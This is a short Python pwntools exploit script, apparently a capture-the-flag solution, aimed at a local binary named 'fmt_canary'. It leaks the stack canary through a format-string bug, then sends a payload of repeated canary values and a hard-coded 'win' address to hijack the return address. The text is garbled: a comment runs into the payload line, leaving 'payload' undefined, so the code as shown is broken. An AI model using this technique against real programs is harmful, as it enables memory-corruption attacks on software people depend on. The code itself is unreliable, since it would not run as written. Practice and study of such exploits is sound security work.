from pwn import *

# Establish connection to the target process
target_process = process('./fmt_canary')

# Clean the output buffer
target_process.clean()

# Use the format vulnerability to leak the canary value
target_process.sendline('yes %19$x')

# Receive and store the leaked canary value
leaked_canary = int(target_process.recvline()[4:], 16)

# Craft the payload to overwrite the return address with the leaked ca$payload = p32(leaked_canary) * 16 + b'\x86\x86\x04\x08'  # Win address$

# Send the crafted payload
target_process.sendline(payload)

# Send a dummy message to trigger the overwritten return address
target_process.clean()
target_process.sendline('hello')

# Clean the output buffer
target_process.clean()
